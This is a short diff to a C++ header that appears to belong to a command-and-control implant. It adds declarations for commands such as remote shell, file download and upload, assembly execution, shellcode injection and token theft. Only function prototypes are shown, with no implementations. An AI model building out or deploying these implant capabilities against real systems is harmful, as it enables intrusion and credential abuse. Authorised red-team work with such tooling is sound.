@@ -22,3 +22,25 @@ typedef struct {
 } ImplantCommand;
 
 extern std::vector<ImplantCommand> g_CommandRegistry;
+
+BOOL CommandChannelRegister( json& args, string artifact, json& result );
+BOOL CommandChannelSwitch( json& args, string artifact, json& result );
+BOOL CommandChannelList( json& args, string artifact, json& result );
+BOOL CommandChannelRemove( json& args, string artifact, json& result );
+BOOL CommandExit( json& args, string artifact, json& result );
+BOOL CommandPs( json& args, string artifact, json& result );
+BOOL CommandCd( json& args, string artifact, json& result );
+BOOL CommandCp( json& args, string artifact, json& result );
+BOOL CommandShell( json& args, string artifact, json& result );
+BOOL CommandDownload( json& args, string artifact, json& result );
+BOOL CommandUpload( json& args, string artifact, json& result );
+BOOL CommandRun( json& args, string artifact, json& result );
+BOOL CommandExecuteAssembly( json& args, string artifact, json& result );
+BOOL CommandJobList( json& args, string artifact, json& result );
+BOOL CommandJobStop( json& args, string artifact, json& result );
+BOOL CommandInlineExecute( json& args, string artifact, json& result );
+BOOL CommandInjectShellcode( json& args, string artifact, json& result );
+BOOL CommandTokenInfo( json& args, string artifact, json& result );
+BOOL CommandTokenRev2Self( json& args, string artifact, json& result );
+BOOL CommandTokenMake( json& args, string artifact, json& result );
+BOOL CommandTokenSteal( json& args, string artifact, json& result );
